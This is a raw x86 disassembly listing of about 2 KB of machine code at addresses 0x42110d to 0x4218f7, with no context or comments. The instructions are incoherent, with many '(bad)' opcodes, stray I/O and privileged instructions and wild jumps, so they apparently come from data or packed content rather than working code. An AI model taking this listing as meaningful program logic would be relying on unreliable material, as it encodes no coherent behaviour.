  42110d:	mov    eax,ds:0x31e5b5cd
  421112:	add    al,0xc2
  421114:	cmp    DWORD PTR [ebx],0x6434f776
  42111a:	pushf  
  42111b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42111c:	rep outs dx,DWORD PTR ds:[esi]
  42111e:	outs   dx,BYTE PTR ds:[esi]
  42111f:	int3   
  421120:	stc    
  421121:	into   
  421122:	push   ss
  421123:	or     eax,0xfd620203
  421128:	sub    eax,DWORD PTR [ecx]
  42112a:	mov    eax,ds:0xd88655af
  42112f:	and    dh,BYTE PTR [ebx+ebp*2]
  421132:	cmp    eax,DWORD PTR [esi-0x4721d3c3]
  421138:	mov    DWORD PTR [ecx+0x3f],ebp
  42113b:	jo     0x4210f2
  42113d:	cmp    al,0xf4
  42113f:	fnstcw WORD PTR [edx]
  421141:	aad    0x11
  421143:	stos   BYTE PTR es:[edi],al
  421144:	dec    ebp
  421145:	dec    edx
  421146:	cmp    al,ah
  421148:	adc    al,0xc
  42114a:	sar    ebp,1
  42114c:	inc    ebp
  42114d:	addr16 loope 0x421156
  421150:	mov    ds:0xf2c76ccb,al
  421155:	fsubp  st(6),st
  421157:	cdq    
  421158:	test   al,0xa8
  42115a:	ret    
  42115b:	jg     0x4211ac
  42115d:	pusha  
  42115e:	mov    ds:0xa9f9840d,al
  421163:	jg     0x4211cd
  421165:	int    0x7f
  421167:	dec    esi
  421168:	in     al,dx
  421169:	mov    BYTE PTR [ebx],dh
  42116b:	ficom  WORD PTR [ecx]
  42116d:	in     al,dx
  42116e:	cmp    ebp,DWORD PTR [ebx+0x3f]
  421171:	ins    BYTE PTR es:[edi],dx
  421172:	fneni(8087 only) 
  421174:	inc    esi
  421175:	inc    edx
  421176:	and    DWORD PTR [ecx-0x74d537],0xffffffcf
  42117d:	sti    
  42117e:	mov    fs,edx
  421180:	jns    0x4211da
  421182:	jne    0x421170
  421184:	mov    ah,0xd1
  421186:	push   ebx
  421187:	adc    esp,ebx
  421189:	test   BYTE PTR [ecx+eiz*1-0x6a],ah
  42118d:	std    
  42118e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118f:	(bad)  
  421190:	xchg   edi,eax
  421191:	fimul  WORD PTR [eax-0x9694eb3]
  421197:	xor    edi,DWORD PTR ds:0x3d1008e8
  42119d:	mov    ebx,0x3d1de86e
  4211a2:	and    esi,DWORD PTR [ecx]
  4211a4:	adc    BYTE PTR [ebx+0x4f3064ef],0xa5
  4211ab:	inc    esp
  4211ac:	cwde   
  4211ad:	sub    edx,DWORD PTR [edi]
  4211af:	cmp    BYTE PTR [ebx-0x19],ah
  4211b2:	or     BYTE PTR [edi+0x78],cl
  4211b5:	sub    al,0x61
  4211b7:	jge    0x42116c
  4211b9:	add    edi,edx
  4211bb:	pop    ebp
  4211bc:	(bad)  
  4211bd:	icebp  
  4211be:	into   
  4211bf:	bound  ebp,QWORD PTR [edx-0x7a1121f7]
  4211c5:	push   ecx
  4211c6:	or     esi,DWORD PTR [ebx+eax*1]
  4211c9:	mov    ch,0xb6
  4211cb:	push   ss
  4211cc:	sar    BYTE PTR [ecx+0x7],1
  4211cf:	mov    ah,0x76
  4211d1:	pop    ebx
  4211d2:	mov    ah,0xb8
  4211d4:	retf   
  4211d5:	leave  
  4211d6:	add    al,0x63
  4211d8:	dec    eax
  4211d9:	and    DWORD PTR [esi+0x2f14aadf],0xffffffdc
  4211e0:	mov    dl,0x69
  4211e2:	sbb    esp,DWORD PTR [eax-0x5c]
  4211e5:	push   0xa31e3697
  4211ea:	push   es
  4211eb:	call   0x49c9fa6e
  4211f0:	inc    ebp
  4211f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211f2:	test   DWORD PTR [eax+eiz*8+0x6a],ebp
  4211f6:	push   esp
  4211f7:	jae    0x4211ea
  4211f9:	jmp    0x481fbd1a
  4211fe:	test   eax,0x30044f29
  421203:	sbb    bh,ah
  421205:	mov    ds:0xbef71a02,eax
  42120a:	or     BYTE PTR [ebx+0x50],0x17
  42120e:	cmc    
  42120f:	add    al,0x9d
  421211:	xlat   BYTE PTR ds:[ebx]
  421212:	xchg   esi,eax
  421213:	out    0xc9,eax
  421215:	cmp    eax,0x775c2175
  42121a:	push   eax
  42121b:	cmp    BYTE PTR [ebx-0x74e24ade],dl
  421221:	retf   0x493a
  421224:	in     eax,0x87
  421226:	dec    ecx
  421227:	xchg   ebx,eax
  421228:	jne    0x4211b6
  42122a:	xchg   edx,eax
  42122b:	lahf   
  42122c:	arpl   WORD PTR [ebp+0x72],cx
  42122f:	std    
  421230:	jle    0x4211f1
  421232:	out    dx,eax
  421233:	sbb    edi,esp
  421235:	mov    BYTE PTR [esp+ebx*4-0x5839ead3],dh
  42123c:	call   0x0:0x1e80001
  421243:	je     0x4212a8
  421245:	inc    ebx
  421246:	sbb    eax,0xe4c19600
  42124b:	sbb    dh,bl
  42124d:	xchg   edi,eax
  42124e:	or     eax,0x633a94b0
  421253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421254:	xchg   ebx,eax
  421255:	adc    DWORD PTR [ebx],0x19
  421258:	imul   edi,DWORD PTR [eax+ecx*4],0x47
  42125c:	fdiv   QWORD PTR [eax+ecx*1+0x70]
  421260:	in     al,dx
  421261:	inc    edi
  421262:	mov    eax,ds:0x94b37a5d
  421267:	inc    esp
  421268:	xchg   edi,eax
  421269:	jge    0x421207
  42126b:	imul   esi,DWORD PTR [ebx-0x3b],0x6c
  42126f:	(bad)  
  421270:	jge    0x421272
  421272:	(bad)  
  421273:	push   0x4a
  421275:	mov    WORD PTR [edx-0x37],gs
  421278:	add    BYTE PTR [esi],al
  42127a:	push   esi
  42127b:	sbb    bh,BYTE PTR [ecx+0x24]
  42127e:	imul   ebp,DWORD PTR [edi+0x3c],0x38
  421282:	xchg   BYTE PTR [eax],dl
  421284:	jb     0x4212b4
  421286:	adc    ebx,DWORD PTR [ecx+0x6a5a9671]
  42128c:	and    al,0x4f
  42128e:	repz cmp eax,0x63d96855
  421294:	fs out dx,al
  421296:	jl     0x4212bd
  421298:	in     eax,dx
  421299:	mov    esp,0x1efc35c8
  42129e:	and    dl,BYTE PTR [ebx+0x4809b036]
  4212a4:	mov    al,ds:0xeef044cd
  4212a9:	cmp    al,0x5
  4212ab:	jle    0x4212e0
  4212ad:	test   DWORD PTR ds:0xebe226fb,esi
  4212b3:	rcr    DWORD PTR [edi+0x6a1bfde0],1
  4212b9:	fimul  WORD PTR [ecx]
  4212bb:	cli    
  4212bc:	mov    ebx,0x43ad07c9
  4212c1:	aas    
  4212c2:	(bad)  [eax]
  4212c4:	imul   ebx,edx,0x1f
  4212c7:	fidiv  DWORD PTR [ecx+0x7c15ea46]
  4212cd:	add    al,BYTE PTR [edi]
  4212cf:	cmp    ah,BYTE PTR [esi+0x107c1721]
  4212d5:	lods   eax,DWORD PTR ds:[esi]
  4212d6:	retf   0xb0c1
  4212d9:	out    dx,eax
  4212da:	popf   
  4212db:	outs   dx,DWORD PTR ds:[esi]
  4212dc:	xor    bl,BYTE PTR [edi+0x6159979e]
  4212e2:	cli    
  4212e3:	ret    0x5bfe
  4212e6:	(bad)  
  4212e7:	mov    WORD PTR [ebx+0x2a90d2fe],?
  4212ed:	jge    0x4212f0
  4212ef:	push   0xffffffff
  4212f1:	push   cs
  4212f2:	ins    DWORD PTR es:[edi],dx
  4212f3:	pop    ss
  4212f4:	inc    eax
  4212f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212f6:	jae    0x42131d
  4212f8:	clc    
  4212f9:	push   es
  4212fa:	in     eax,0x5b
  4212fc:	dec    ebp
  4212fd:	popa   
  4212fe:	xor    DWORD PTR [edx-0x3],esi
  421301:	shl    BYTE PTR [eax],0x90
  421304:	je     0x42130c
  421306:	add    bh,0xe5
  421309:	outs   dx,BYTE PTR ds:[esi]
  42130a:	mov    ebp,0xc5930aaf
  42130f:	push   ecx
  421310:	hlt    
  421311:	mov    ecx,0x32534031
  421316:	fistp  WORD PTR [ecx]
  421318:	cmp    ah,BYTE PTR [edx-0x68]
  42131b:	and    DWORD PTR [ecx+0x49fefd97],ebp
  421321:	jmp    0xa9b7:0x3893cadb
  421328:	aaa    
  421329:	cli    
  42132a:	loop   0x421309
  42132c:	aas    
  42132d:	jmp    0xd0c5:0x2f6508d6
  421334:	cwde   
  421335:	je     0x421300
  421337:	push   esi
  421338:	mov    esp,DWORD PTR [ebx+0x26]
  42133b:	mov    ch,0xa6
  42133d:	adc    DWORD PTR [esi-0x38],esp
  421340:	mov    cl,0x9d
  421342:	int3   
  421343:	pop    edx
  421344:	js     0x421360
  421346:	mov    edi,DWORD PTR [ebx+0x7f]
  421349:	push   edx
  42134a:	xor    edi,esp
  42134c:	sbb    BYTE PTR [eax],bh
  42134e:	inc    esi
  42134f:	pop    ebp
  421350:	jmp    0xc214729c
  421355:	ret    
  421356:	mov    esp,0x1d1b788
  42135b:	les    edi,FWORD PTR [ebx]
  42135d:	popa   
  42135e:	fild   DWORD PTR [esi]
  421360:	out    0xc9,al
  421362:	int3   
  421363:	cmp    al,0x83
  421365:	imul   edi
  421367:	xor    BYTE PTR [esi-0xf],dl
  42136a:	ds push ecx
  42136c:	in     al,dx
  42136d:	xor    BYTE PTR [esi+eiz*4-0x4c7a4926],dh
  421374:	xor    eax,0xaa3bcd79
  421379:	adc    DWORD PTR [ebp+0x1f],esi
  42137c:	sub    BYTE PTR [ebx],ah
  42137e:	pop    ebp
  42137f:	mov    eax,ds:0x68be6ecc
  421384:	mov    ds:0xce3ef235,al
  421389:	mov    al,0xdc
  42138b:	dec    ebp
  42138c:	push   ecx
  42138d:	sbb    bh,ah
  42138f:	sub    eax,0xe10fae2
  421394:	jno    0x421386
  421396:	mov    edi,ecx
  421398:	ja     0x42132f
  42139a:	push   edx
  42139b:	loop   0x421412
  42139d:	or     dh,bh
  42139f:	jecxz  0x42137b
  4213a1:	cmp    BYTE PTR [edi+0x690646d6],dl
  4213a7:	ret    
  4213a8:	xchg   esi,eax
  4213a9:	pmulhuw mm1,QWORD PTR [edi-0x5b]
  4213ad:	icebp  
  4213ae:	mov    eax,ds:0x6e2f15a0
  4213b3:	push   eax
  4213b4:	xor    edx,DWORD PTR [edi]
  4213b6:	push   eax
  4213b7:	cld    
  4213b8:	push   ds
  4213b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ba:	mov    ds:0xa7747dd9,al
  4213bf:	stos   DWORD PTR es:[edi],eax
  4213c0:	or     al,0xac
  4213c2:	es pop ds
  4213c4:	add    ah,al
  4213c6:	mov    DWORD PTR [ecx],ecx
  4213c8:	stos   DWORD PTR es:[edi],eax
  4213c9:	xchg   ecx,eax
  4213ca:	dec    edi
  4213cb:	hlt    
  4213cc:	rol    DWORD PTR [edi+ecx*1],cl
  4213cf:	ficom  DWORD PTR [edx]
  4213d1:	adc    dl,al
  4213d3:	les    ebx,FWORD PTR [edx-0x5]
  4213d6:	sub    eax,DWORD PTR [edi-0x4b821adb]
  4213dc:	push   0xffffffad
  4213de:	mov    DWORD PTR [ebx+esi*4+0x1e],edx
  4213e2:	cmp    edx,edx
  4213e4:	es addr16 xchg edi,eax
  4213e7:	push   edi
  4213e8:	mov    DWORD PTR [eax+0x4241c84e],edi
  4213ee:	mov    ecx,DWORD PTR [ebp+0x72]
  4213f1:	(bad)  
  4213f2:	push   ecx
  4213f3:	outs   dx,DWORD PTR ds:[esi]
  4213f4:	inc    eax
  4213f5:	and    bh,BYTE PTR [eax-0x513730a7]
  4213fb:	call   0x2e90a1f0
  421400:	mov    al,ds:0xfed58231
  421405:	or     BYTE PTR [ebx+ebp*8-0xb00eba],al
  42140c:	jge    0x421468
  42140e:	dec    ebp
  42140f:	push   es
  421410:	les    esi,FWORD PTR [edi]
  421412:	inc    eax
  421413:	jle    0x4213eb
  421415:	push   esi
  421416:	jne    0x421423
  421418:	mov    ah,0x84
  42141a:	mov    ds:0x5eb8ccbd,eax
  42141f:	les    ebp,FWORD PTR [ebx+edi*2+0xc]
  421423:	cmp    DWORD PTR [edx-0x253f3ce3],ecx
  421429:	fucomp st(4)
  42142b:	jo     0x421450
  42142d:	and    eax,0x7c6f7769
  421432:	cmp    esp,DWORD PTR [eax+0x1cbcee1c]
  421438:	cmc    
  421439:	(bad)  
  42143b:	(bad)  
  42143c:	pushf  
  42143d:	add    DWORD PTR [eax],eax
  42143f:	call   0x64421445
  421444:	sbb    esp,ecx
  421446:	mov    BYTE PTR [eax+0x1efc760b],dh
  42144c:	and    BYTE PTR [eax],dl
  42144e:	xor    esp,DWORD PTR [ebp+0x6f091a14]
  421454:	push   0xdc3aa53b
  421459:	dec    ecx
  42145a:	(bad)  [eax]
  42145c:	xchg   ebx,eax
  42145d:	call   0xdfc36507
  421462:	shl    cl,0xed
  421465:	fisub  DWORD PTR [eax+esi*8]
  421468:	pop    ss
  421469:	int    0x20
  42146b:	shl    BYTE PTR ds:0x357622ba,0x40
  421472:	cmp    BYTE PTR [eax],ch
  421474:	popa   
  421475:	mov    dh,0xaf
  421477:	in     eax,0x74
  421479:	inc    edx
  42147a:	fs pop ebp
  42147c:	pop    ebp
  42147d:	sub    edx,DWORD PTR [ebp+0x6c2ea11c]
  421483:	test   eax,0x9bab095e
  421488:	mov    esi,0xeace13fa
  42148d:	jle    0x42143e
  42148f:	mov    eax,ds:0x4a254b3e
  421494:	sbb    eax,0xaf349612
  421499:	xchg   ecx,eax
  42149a:	ret    0xbea7
  42149d:	retf   
  42149e:	dec    esp
  42149f:	adc    edi,0xe80b1f5c
  4214a5:	sub    eax,0x95d68fe9
  4214aa:	repz xor DWORD PTR [eax-0x1a4c2ed1],esi
  4214b1:	call   0x3b5eb1f9
  4214b6:	mov    esi,esi
  4214b8:	or     edx,eax
  4214ba:	sahf   
  4214bb:	dec    DWORD PTR [edi-0x5c]
  4214be:	ins    DWORD PTR es:[edi],dx
  4214bf:	sar    ebx,1
  4214c1:	cmp    edi,ebx
  4214c3:	icebp  
  4214c4:	and    DWORD PTR [ebp+0x25],0xffffffc2
  4214c8:	lahf   
  4214c9:	(bad)  
  4214ca:	cmp    eax,0x7e5e6380
  4214cf:	jmp    0xfd28d8c3
  4214d4:	sbb    dh,bh
  4214d6:	sbb    bh,BYTE PTR [edx]
  4214d8:	adc    al,BYTE PTR [ecx+eax*4]
  4214db:	push   eax
  4214dc:	xchg   ebx,eax
  4214dd:	ret    
  4214de:	xchg   edi,eax
  4214df:	jl     0x421508
  4214e1:	xchg   ebx,eax
  4214e2:	fistp  QWORD PTR [esp+edi*8]
  4214e5:	test   DWORD PTR [edx-0x4cdfa0fd],edx
  4214eb:	adc    al,0x93
  4214ed:	adc    BYTE PTR [ebp+eiz*1-0x57867724],al
  4214f4:	jns    0x4214f1
  4214f6:	pop    eax
  4214f7:	push   edi
  4214f8:	mov    dl,0x6f
  4214fa:	dec    eax
  4214fb:	ret    
  4214fc:	repz arpl WORD PTR [esi-0x73634230],sp
  421503:	push   cs
  421504:	pop    esi
  421505:	icebp  
  421506:	loopne 0x4214d5
  421508:	sbb    BYTE PTR fs:[esi-0x76],0x29
  42150d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42150e:	mov    dh,0xa0
  421510:	jo     0x421515
  421512:	add    BYTE PTR [esi-0x48],bh
  421515:	or     BYTE PTR fs:[ebp+0xa],al
  421519:	ret    
  42151a:	test   eax,0xb47ac2b9
  42151f:	xchg   esp,esi
  421521:	hlt    
  421522:	cmp    esp,ebx
  421524:	cs xchg ebp,eax
  421526:	outs   dx,BYTE PTR ds:[esi]
  421527:	adc    ch,cl
  421529:	daa    
  42152a:	jbe    0x42157b
  42152c:	xor    eax,0xbdce4c5a
  421531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421532:	fadd   DWORD PTR [ecx-0x17f23efe]
  421538:	inc    ecx
  421539:	jmp    0x421558
  42153b:	and    DWORD PTR [ebx+ecx*2-0x75109cb2],0x11
  421543:	jb     0x421563
  421545:	dec    esp
  421546:	stos   DWORD PTR es:[edi],eax
  421547:	loope  0x42154a
  421549:	push   ecx
  42154a:	xchg   DWORD PTR [eax+0xa],edi
  42154d:	call   0x7632a029
  421552:	retf   
  421553:	mov    esp,0x4653b8d1
  421558:	shl    DWORD PTR [edx+eiz*4+0x17],1
  42155c:	pop    es
  42155d:	inc    edi
  42155e:	ret    
  42155f:	sbb    dl,BYTE PTR [edx-0x1b18eaaf]
  421565:	add    cl,bl
  421567:	mov    dh,0x34
  421569:	xchg   ebx,eax
  42156a:	mov    BYTE PTR [ebx],bl
  42156c:	inc    esp
  42156d:	inc    esp
  42156e:	inc    esp
  42156f:	jnp    0x421529
  421571:	jle    0x4215eb
  421573:	xor    BYTE PTR [esi-0x67],ah
  421576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421577:	xchg   DWORD PTR [ecx-0x10535fc9],edx
  42157d:	add    eax,0xd1c48630
  421582:	adc    dh,BYTE PTR [ecx+ebx*4-0x40]
  421586:	lea    ebx,[eax-0x41]
  421589:	jmp    0x421559
  42158b:	retf   
  42158c:	stc    
  42158d:	inc    ebx
  42158e:	ror    BYTE PTR [edx+0x6c],cl
  421591:	pop    esp
  421592:	and    eax,DWORD PTR [edx]
  421594:	retf   
  421595:	inc    ebx
  421596:	outs   dx,BYTE PTR ds:[esi]
  421597:	pop    ebp
  421598:	frstor [ebx]
  42159a:	add    eax,DWORD PTR es:[ebx]
  42159d:	dec    esi
  42159e:	out    dx,al
  42159f:	int3   
  4215a0:	rcr    BYTE PTR [ecx-0x14],1
  4215a3:	loope  0x421570
  4215a5:	jl     0x421613
  4215a7:	retf   
  4215a8:	std    
  4215a9:	test   BYTE PTR [ebx+0x504eb639],bh
  4215af:	mov    ch,0x9e
  4215b1:	dec    esp
  4215b2:	push   ebp
  4215b3:	bnd jl 0x421588
  4215b6:	retf   0xcf47
  4215b9:	xchg   ecx,eax
  4215ba:	add    dl,bh
  4215bc:	xchg   edi,eax
  4215bd:	dec    edx
  4215be:	cld    
  4215bf:	jmp    DWORD PTR [esi+edi*8+0x4b]
  4215c3:	add    al,0xc4
  4215c5:	sbb    ecx,esi
  4215c7:	mov    edi,0x576f2439
  4215cc:	stc    
  4215cd:	sbb    ah,BYTE PTR [ebp+0x3b]
  4215d0:	pop    ebx
  4215d1:	sub    esi,DWORD PTR [edi+0x3]
  4215d4:	stc    
  4215d5:	shl    BYTE PTR ss:[edx+ebx*2-0x45],1
  4215da:	jge    0x421574
  4215dc:	fstp   QWORD PTR [eax]
  4215de:	cmp    BYTE PTR [ecx+edx*8],0xb6
  4215e2:	sub    eax,ebp
  4215e4:	scas   al,BYTE PTR es:[edi]
  4215e5:	fsub   DWORD PTR [ebp+ebp*4-0x24]
  4215e9:	mov    edi,0xa51d4d4d
  4215ee:	xchg   edi,eax
  4215ef:	ss cmc 
  4215f1:	sub    dh,BYTE PTR [edx-0x21]
  4215f4:	fsubrp st(0),st
  4215f6:	aas    
  4215f7:	and    eax,0x6cf3f60a
  4215fc:	push   ebp
  4215fd:	xchg   esi,eax
  4215fe:	and    ecx,DWORD PTR [esp+ebp*1]
  421601:	(bad)
  421604:	into   
  421605:	inc    edi
  421606:	sti    
  421607:	inc    esp
  421608:	dec    edx
  421609:	outs   dx,BYTE PTR ds:[esi]
  42160a:	add    BYTE PTR [ebp-0xfc1325c],0xb5
  421611:	pop    esp
  421612:	xchg   ebx,eax
  421613:	xor    al,0x25
  421615:	into   
  421616:	out    dx,eax
  421617:	fs and BYTE PTR es:[edi+ecx*2-0x3b47af89],ah
  421620:	popf   
  421621:	retf   0xb90c
  421624:	imul   ch
  421626:	je     0x421670
  421628:	inc    esp
  421629:	inc    edx
  42162a:	hlt    
  42162b:	xchg   esp,eax
  42162c:	nop
  42162d:	ffree  st(0)
  42162f:	(bad)  
  421631:	popf   
  421632:	aam    0x57
  421634:	(bad)
  421638:	dec    ebx
  421639:	ret    
  42163a:	mov    esi,0x19e77
  42163f:	call   0xf6421645
  421644:	sub    al,0x18
  421646:	shr    DWORD PTR [edi+0x2c],0xd8
  42164a:	pushf  
  42164b:	das    
  42164c:	aad    0x39
  42164e:	fwait
  42164f:	sbb    BYTE PTR [ebx+0x30],0xba
  421653:	(bad)  
  421654:	cli    
  421655:	lds    edi,FWORD PTR [eax+0x54e31313]
  42165b:	ins    DWORD PTR es:[edi],dx
  42165c:	xor    al,0x98
  42165e:	sub    dl,ah
  421660:	jae    0x421625
  421662:	sub    BYTE PTR [edx+0x27],ch
  421665:	arpl   WORD PTR [ebp+0x5c9a4d2f],sp
  42166b:	cmc    
  42166c:	pop    ds
  42166d:	or     DWORD PTR [esi-0x51],0x1611dcbc
  421674:	loope  0x421609
  421676:	pop    ebp
  421677:	dec    esp
  421678:	into   
  421679:	popf   
  42167a:	retf   0x1f0c
  42167d:	pop    ecx
  42167e:	or     al,0xea
  421680:	mov    esi,0xa3008263
  421685:	retf   0xa790
  421688:	outs   dx,BYTE PTR ds:[esi]
  421689:	aaa    
  42168a:	loope  0x42164d
  42168c:	ret    
  42168d:	add    esp,esp
  42168f:	dec    ebp
  421690:	push   ds
  421691:	pop    es
  421692:	ret    
  421693:	jg     0x4216d2
  421695:	add    ecx,esi
  421697:	jmp    0x6a4:0xd900a620
  42169e:	das    
  42169f:	inc    esi
  4216a0:	inc    edi
  4216a1:	add    ebx,0x537da72f
  4216a7:	mov    esp,0xf0e5b54c
  4216ac:	pusha  
  4216ad:	pop    esp
  4216ae:	inc    edi
  4216af:	inc    eax
  4216b0:	or     BYTE PTR [esi+0x40],dh
  4216b3:	and    eax,0x7dee59ef
  4216b8:	sbb    eax,0xb26d27bd
  4216bd:	in     eax,0x79
  4216bf:	xchg   ebp,eax
  4216c0:	fwait
  4216c1:	scas   eax,DWORD PTR es:[edi]
  4216c2:	hlt    
  4216c3:	scas   al,BYTE PTR es:[edi]
  4216c4:	mov    ch,0xfe
  4216c6:	push   esi
  4216c7:	(bad)  
  4216c8:	jnp    0x4216a4
  4216ca:	sub    dl,BYTE PTR [esp+eiz*2]
  4216cd:	ret    0xc537
  4216d0:	in     al,0x84
  4216d2:	or     DWORD PTR [ebx-0x7b],esp
  4216d5:	dec    eax
  4216d6:	mov    edi,0x44e9f905
  4216db:	rcl    ecx,0xa1
  4216de:	(bad)  
  4216df:	jae    0x421713
  4216e1:	jmp    DWORD PTR [ebx-0x37]
  4216e4:	hlt    
  4216e5:	mov    ds:0x260f053,al
  4216ea:	pop    ss
  4216eb:	in     al,dx
  4216ec:	inc    esp
  4216ed:	push   esp
  4216ee:	pop    esp
  4216ef:	ds pushf 
  4216f1:	xchg   bl,dh
  4216f3:	xchg   esp,eax
  4216f4:	retf   
  4216f5:	stos   BYTE PTR es:[edi],al
  4216f6:	into   
  4216f7:	push   es
  4216f8:	or     edx,DWORD PTR [eax]
  4216fa:	push   ebx
  4216fb:	xor    BYTE PTR [esi+0x14],dh
  4216fe:	xor    bh,ch
  421700:	pushf  
  421701:	dec    ecx
  421702:	es call 0x6cf4ae4f
  421708:	adc    esp,DWORD PTR [edx]
  42170a:	inc    ecx
  42170b:	jp     0x421783
  42170d:	cmp    bh,bl
  42170f:	sbb    eax,0x4adaf1c1
  421714:	int3   
  421715:	jns    0x4216f1
  421717:	icebp  
  421718:	icebp  
  421719:	popf   
  42171a:	bound  edx,QWORD PTR [ebx]
  42171c:	scas   eax,DWORD PTR es:[edi]
  42171d:	mov    edi,0x98d6ca21
  421722:	sar    BYTE PTR [esi-0x31d1fc50],0x68
  421729:	(bad)  
  42172a:	cld    
  42172b:	pop    edx
  42172c:	fabs   
  42172e:	mov    eax,0xe9af152d
  421733:	test   al,0x3d
  421735:	jnp    0x42172f
  421737:	mov    gs,WORD PTR [ebx]
  421739:	push   ebp
  42173a:	adc    edi,DWORD PTR [ecx+0x63]
  42173d:	lahf   
  42173e:	mov    bh,0x91
  421740:	jbe    0x421736
  421742:	out    0x59,eax
  421744:	dec    edi
  421745:	or     eax,0x50c3bd44
  42174a:	push   edi
  42174b:	std    
  42174c:	aad    0xe3
  42174e:	pop    esp
  421750:	push   cs
  421751:	cmp    al,0x5f
  421753:	mov    cl,0x9d
  421755:	fisubr WORD PTR cs:[edi]
  421758:	aad    0x1d
  42175a:	adc    dh,BYTE PTR [ebp-0x6f]
  42175d:	xchg   edx,eax
  42175e:	loop   0x4216e3
  421760:	mov    ebp,0xf9b1af90
  421765:	ror    DWORD PTR [esi+eax*4-0x3bd3dd17],cl
  42176c:	test   eax,0x67594f0b
  421771:	sbb    ebx,DWORD PTR [eax]
  421773:	pop    esp
  421774:	or     al,0xed
  421776:	leave  
  421777:	retf   0xc9bd
  42177a:	pop    es
  42177b:	jge    0x42177c
  42177d:	mov    esp,0x50d71691
  421782:	jbe    0x421746
  421784:	fisub  DWORD PTR [eax+0x23ad8a87]
  42178a:	iret   
  42178b:	mov    edx,0xf7e1988d
  421790:	cld    
  421791:	jnp    0x42175c
  421793:	in     al,dx
  421794:	adc    al,0xdb
  421796:	mov    ch,0x74
  421798:	into   
  421799:	adc    BYTE PTR [ebp+0x51],al
  42179c:	cs leave 
  42179e:	push   cs
  42179f:	shl    ecx,cl
  4217a1:	xchg   DWORD PTR [ebx+0x17aaed6d],eax
  4217a7:	mov    al,ds:0x963414d7
  4217ac:	aad    0xc5
  4217ae:	neg    DWORD PTR [eax-0x70a1b66a]
  4217b4:	aas    
  4217b5:	pop    esp
  4217b6:	int3   
  4217b7:	cbw    
  4217b9:	push   esp
  4217ba:	adc    eax,0x2105088d
  4217bf:	and    DWORD PTR [edx-0x27123d10],0x67f3d858
  4217c9:	adc    DWORD PTR [edi],esp
  4217cb:	add    DWORD PTR [ecx+0x4c],edx
  4217ce:	push   ebp
  4217cf:	es jne 0x421848
  4217d2:	xchg   esi,eax
  4217d3:	sub    DWORD PTR [esi-0x22bd8c24],0x6
  4217da:	push   ecx
  4217db:	cmp    DWORD PTR [eax],edi
  4217dd:	xor    DWORD PTR [eax+edx*2+0x19],esp
  4217e1:	dec    esi
  4217e2:	loopne 0x421787
  4217e4:	mov    ecx,0x2931add5
  4217e9:	mov    DWORD PTR [ebx],0x4db213f6
  4217ef:	mov    esi,0xc6a2c970
  4217f4:	mov    esp,0x8ac251f7
  4217f9:	ja     0x421803
  4217fb:	add    bh,BYTE PTR ds:0xc4d04fcd
  421801:	xor    eax,0x6bc521a5
  421806:	fadd   st,st(5)
  421808:	imul   BYTE PTR [ebp+0x4faa89e0]
  42180e:	mov    bh,0x45
  421810:	hlt    
  421811:	jecxz  0x421836
  421813:	sub    dl,0xf2
  421816:	mov    eax,0xa10fd755
  42181b:	loop   0x421846
  42181d:	cdq    
  42181e:	add    eax,0x24e4092
  421823:	retf   0x37
  421826:	add    al,BYTE PTR [ebp-0xb57389d]
  42182c:	mov    dl,0x32
  42182e:	(bad)  
  42182f:	jbe    0x421807
  421831:	hlt    
  421832:	mov    dl,0xb1
  421834:	and    al,0xfe
  421836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421837:	cli    
  421838:	lock ja 0x42181c
  42183b:	pop    edi
  42183c:	mov    al,ds:0x1e80001
  421841:	add    BYTE PTR [eax],al
  421843:	out    dx,al
  421844:	inc    eax
  421845:	jo     0x421829
  421847:	iret   
  421848:	pop    ebx
  421849:	inc    ebx
  42184a:	mov    edx,0x9ea6290b
  42184f:	push   es
  421850:	adc    BYTE PTR [ecx],bl
  421852:	lock mov bh,0xe9
  421855:	mov    ebp,0xffa7eec2
  42185a:	shl    DWORD PTR [ebx+0x85931b7],0x4a
  421861:	(bad)  [ebx]
  421863:	sub    eax,0xdbd91dbc
  421868:	mov    edx,0x13cf4dd5
  42186d:	dec    ecx
  42186e:	test   BYTE PTR [eax],0xd5
  421871:	cmp    bh,dl
  421873:	add    al,0x2c
  421875:	icebp  
  421876:	jecxz  0x42182d
  421878:	jae    0x421832
  42187a:	jae    0x4218d6
  42187c:	add    BYTE PTR [ecx-0x4b202a39],0xe
  421883:	pop    eax
  421884:	ret    
  421885:	lock sub BYTE PTR [esp+ebx*8+0x393e0d54],bl
  42188d:	adc    eax,0xee1f69b
  421892:	xor    dl,cl
  421894:	mov    WORD PTR cs:[ebx],ds
  421897:	fisttp QWORD PTR [edi+ebp*8+0x4a]
  42189b:	push   edx
  42189c:	cmp    BYTE PTR [esi+0x1b],dl
  42189f:	xchg   edx,eax
  4218a0:	mov    ch,0x8e
  4218a2:	faddp  st(7),st
  4218a4:	mov    ecx,0x7f310dd9
  4218a9:	(bad)  
  4218aa:	cmp    edx,DWORD PTR [edi-0x194a26e9]
  4218b0:	sub    eax,0x4c82e3cb
  4218b5:	dec    edi
  4218b6:	push   0x158b6124
  4218bb:	push   edx
  4218bc:	sti    
  4218bd:	retf   
  4218be:	xchg   DWORD PTR [edx],esp
  4218c0:	push   0x55c3cd19
  4218c5:	arpl   WORD PTR [ebp+eiz*2+0x1db0022a],ax
  4218cc:	or     dl,BYTE PTR [edi]
  4218ce:	jo     0x4218c7
  4218d0:	lahf   
  4218d1:	add    al,0xfa
  4218d3:	sbb    ebx,eax
  4218d5:	mov    ecx,0x73d9cd7e
  4218da:	dec    DWORD PTR [ecx-0x1a]
  4218dd:	jb     0x42187b
  4218df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e0:	jge    0x42191f
  4218e2:	jge    0x4218d9
  4218e4:	stos   DWORD PTR es:[edi],eax
  4218e5:	jne    0x4218ad
  4218e7:	test   eax,0xfe381cf9
  4218ec:	leave  
  4218ed:	imul   edi,DWORD PTR [ebp-0x1764472b],0x5b4043d6
  4218f7:	jbe    0x421973
